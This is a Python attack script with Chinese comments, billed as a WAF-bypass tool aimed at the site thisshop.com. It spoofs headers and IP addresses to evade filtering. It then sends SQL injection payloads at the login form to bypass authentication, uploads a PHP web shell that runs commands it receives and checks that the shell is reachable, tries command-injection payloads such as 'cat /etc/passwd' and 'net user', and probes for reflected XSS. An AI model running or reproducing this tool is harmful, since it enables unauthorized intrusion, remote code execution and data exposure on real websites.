#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
稳定版WAF绕过工具
目标: https://thisshop.com
功能: 多层次WAF绕过技术
"""

import requests
import time
import random
import json
import base64
from datetime import datetime

class StableWAFBypass:
    def __init__(self):
        self.target = "https://thisshop.com"
        self.results = []
        self.session = requests.Session()
        self.success_count = 0
        self.total_attempts = 0

        # 用户代理池
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1'
        ]

    def random_delay(self):
        """随机延迟"""
        time.sleep(random.uniform(1, 3))

    def random_headers(self):
        """随机生成请求头"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Cache-Control': 'max-age=0'
        }

        # 随机添加一些额外的头
        if random.random() < 0.3:
            headers['X-Forwarded-For'] = self.random_ip()
        if random.random() < 0.3:
            headers['X-Real-IP'] = self.random_ip()

        return headers

    def random_ip(self):
        """生成随机IP"""
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

    def make_request(self, url, method='POST', data=None):
        """发送请求"""
        try:
            self.random_delay()
            self.total_attempts += 1

            headers = self.random_headers()

            if method == 'POST':
                response = self.session.post(url, data=data, headers=headers, timeout=30)
            else:
                response = self.session.get(url, headers=headers, timeout=30)

            return response

        except Exception as e:
            print(f"请求失败: {e}")
            return None

    def encode_payload(self, payload, encoding_type='base64'):
        """编码payload"""
        try:
            if encoding_type == 'base64':
                return base64.b64encode(payload.encode('utf-8')).decode('utf-8')
            elif encoding_type == 'url':
                from urllib.parse import quote
                return quote(payload)
            elif encoding_type == 'hex':
                return payload.encode('utf-8').hex()
            else:
                return payload
        except:
            return payload

    def test_sql_injection(self):
        """测试SQL注入绕过"""
        print("[*] 测试SQL注入绕过...")

        sql_payloads = [
            {'payload': "' OR 1=1--", 'description': '基础布尔盲注'},
            {'payload': "' UNION SELECT NULL--", 'description': '联合查询注入'},
            {'payload': "' AND SLEEP(5)--", 'description': '时间盲注'},
            {'payload': "' WAITFOR DELAY '0:0:5'--", 'description': 'SQL Server延迟注入'},
            {'payload': "'/**/OR/**/1=1--", 'description': '注释混淆注入'},
            {'payload': "';%0aSELECT%0aNULL--", 'description': '换行符注入'},
            {'payload': "' AND 1=CONVERT(INT,@@VERSION)--", 'description': '错误注入'},
        ]

        encoding_types = ['base64', 'url', 'hex']

        for payload_info in sql_payloads:
            print(f"[*] 测试: {payload_info['description']}")

            for encoding in encoding_types:
                encoded_payload = self.encode_payload(payload_info['payload'], encoding)

                data = {'username': encoded_payload, 'password': 'test'}
                response = self.make_request(self.target, method='POST', data=data)

                if response and response.status_code == 200:
                    text = response.text.lower()

                    # 检查成功指标
                    success_indicators = [
                        'welcome', 'dashboard', 'logged in', 'success', 'welcome back',
                        'login successful', 'authenticated', 'profile', 'account'
                    ]

                    error_indicators = [
                        'error', 'invalid', 'failed', 'wrong', 'incorrect',
                        'access denied', 'forbidden', 'unauthorized'
                    ]

                    success_found = any(indicator in text for indicator in success_indicators)
                    error_found = any(indicator in text for indicator in error_indicators)

                    if success_found and not error_found:
                        print(f"[✓] SQL注入绕过成功! 编码: {encoding}")
                        self.results.append({
                            'type': 'SQL Injection',
                            'description': payload_info['description'],
                            'encoding': encoding,
                            'success': True,
                            'status': response.status_code
                        })
                        self.success_count += 1
                        return True
                    elif error_found:
                        print(f"[-] 检测到错误响应: {encoding}")
                    else:
                        print(f"[-] 无明确响应: {encoding}")

        return False

    def test_file_upload(self):
        """测试文件上传绕过"""
        print("[*] 测试文件上传绕过...")

        # 简单的webshell
        webshell = '''<?php
if(isset($_REQUEST['cmd'])) {
    $output = shell_exec($_REQUEST['cmd']);
    echo "<pre>$output</pre>";
}
?>'''

        file_combinations = [
            ('shell.php', 'application/x-php'),
            ('shell.phtml', 'application/x-php'),
            ('shell.php3', 'application/x-php'),
            ('shell.jpg', 'image/jpeg'),
            ('shell.png', 'image/png')
        ]

        for filename, content_type in file_combinations:
            print(f"[*] 测试文件: {filename}")

            files = {
                'file': (filename, webshell, content_type),
                'submit': ('submit', 'upload', 'application/x-www-form-urlencoded')
            }

            upload_url = f"{self.target}/upload"
            response = self.make_request(upload_url, method='POST', data=files)

            if response and response.status_code == 200:
                text = response.text.lower()
                upload_success = any(indicator in text for indicator in [
                    'upload successful', 'file uploaded', 'upload complete', 'success'
                ])

                if upload_success:
                    print(f"[✓] 文件上传成功! 文件名: {filename}")
                    self.results.append({
                        'type': 'File Upload',
                        'filename': filename,
                        'success': True,
                        'status': response.status_code
                    })
                    self.success_count += 1

                    # 尝试访问上传的文件
                    access_url = f"{self.target}/uploads/{filename}"
                    access_response = self.make_request(access_url)

                    if access_response and access_response.status_code == 200:
                        print(f"[✓] Webshell可访问!")
                        self.results.append({
                            'type': 'Webshell Access',
                            'url': access_url,
                            'success': True,
                            'status': access_response.status_code
                        })
                        self.success_count += 1
                        return True
                    else:
                        print(f"[-] Webshell访问失败")
                else:
                    print(f"[-] 上传失败: {filename}")
            else:
                print(f"[-] 请求失败: {filename}")

        return False

    def test_command_injection(self):
        """测试命令注入绕过"""
        print("[*] 测试命令注入绕过...")

        command_endpoints = [
            ('ping', 'host'),
            ('traceroute', 'target'),
            ('exec', 'command'),
            ('system', 'cmd')
        ]

        command_payloads = [
            '&& whoami',
            '&& ipconfig',
            '&& dir',
            '&& net user',
            '|| dir',
            '| whoami',
            '& whoami',
            '&& powershell whoami',
            '&& cat /etc/passwd',
            '&& ls -la'
        ]

        for endpoint, param in command_endpoints:
            print(f"[*] 测试端点: {endpoint}")

            for payload in command_payloads:
                data = {param: payload}
                test_url = f"{self.target}/{endpoint}"
                response = self.make_request(test_url, method='POST', data=data)

                if response and response.status_code == 200:
                    text = response.text

                    # 检查命令执行结果
                    execution_indicators = [
                        'Administrator', 'root', 'Users', 'C:\\', '/home/', '/etc/',
                        '192.168.', '127.0.0.1', 'localhost', 'cmd.exe', 'powershell'
                    ]

                    if any(indicator in text for indicator in execution_indicators):
                        print(f"[✓] 命令注入成功! 端点: {endpoint}")
                        self.results.append({
                            'type': 'Command Injection',
                            'endpoint': endpoint,
                            'payload': payload,
                            'success': True,
                            'status': response.status_code
                        })
                        self.success_count += 1
                        return True
                    else:
                        print(f"[-] 命令注入失败: {endpoint}")

        return False

    def test_xss(self):
        """测试XSS绕过"""
        print("[*] 测试XSS绕过...")

        xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'<script>alert(1)</script>",
            '<img src=x onerror="alert(1)">',
            '<svg onload="alert(1)">',
            '<body onload="alert(1)">'
        ]

        xss_params = ['q', 'search', 'query', 'keyword', 'name', 'user', 'id']

        for param in xss_params:
            for payload in xss_payloads:
                data = {param: payload}
                response = self.make_request(self.target, method='POST', data=data)

                if response and response.status_code == 200:
                    text = response.text

                    if payload in text:
                        print(f"[✓] XSS成功! 参数: {param}")
                        self.results.append({
                            'type': 'XSS Reflected',
                            'parameter': param,
                            'payload': payload,
                            'success': True,
                            'status': response.status_code
                        })
                        self.success_count += 1
                        return True

        return False

    def generate_report(self):
        """生成报告"""
        report = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'total_attempts': self.total_attempts,
            'successful_bypasses': self.success_count,
            'success_rate': (self.success_count / max(self.total_attempts, 1)) * 100,
            'results': self.results
        }

        # 保存报告
        filename = f"stable_waf_bypass_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)

        print(f"\n[+] 报告已保存: {filename}")
        return report

    def run(self):
        """运行测试"""
        print("=" * 60)
        print("稳定版WAF绕过工具")
        print("目标:", self.target)
        print("=" * 60)

        start_time = time.time()

        # 执行各种测试
        tests = [
            ("SQL注入绕过", self.test_sql_injection),
            ("文件上传绕过", self.test_file_upload),
            ("命令注入绕过", self.test_command_injection),
            ("XSS绕过", self.test_xss)
        ]

        for test_name, test_func in tests:
            print(f"\n{'='*20} {test_name} {'='*20}")
            try:
                test_func()
            except Exception as e:
                print(f"[X] {test_name}测试出错: {e}")

        # 生成报告
        end_time = time.time()
        duration = end_time - start_time

        print("\n" + "=" * 60)
        print("WAF绕过测试结果")
        print("=" * 60)
        print(f"目标: {self.target}")
        print(f"测试耗时: {duration:.2f} 秒")
        print(f"总尝试次数: {self.total_attempts}")
        print(f"成功绕过次数: {self.success_count}")
        print(f"成功率: {(self.success_count / max(self.total_attempts, 1)) * 100:.2f}%")

        if self.results:
            print("\n成功案例:")
            for i, result in enumerate([r for r in self.results if r['success']], 1):
                print(f"  {i}. {result['type']} - {result.get('description', result.get('payload', result.get('filename', 'N/A')))}")

        # 生成最终报告
        final_report = self.generate_report()

        return self.success_count > 0

def main():
    try:
        tool = StableWAFBypass()
        success = tool.run()

        if success:
            print("\n[✓] WAF绕过测试成功完成！发现可利用漏洞。")
            return 0
        else:
            print("\n[!] WAF绕过测试完成，目标具有强大的防护能力。")
            return 1

    except Exception as e:
        print(f"\n[X] 执行错误: {e}")
        return 1

if __name__ == "__main__":
    exit(main())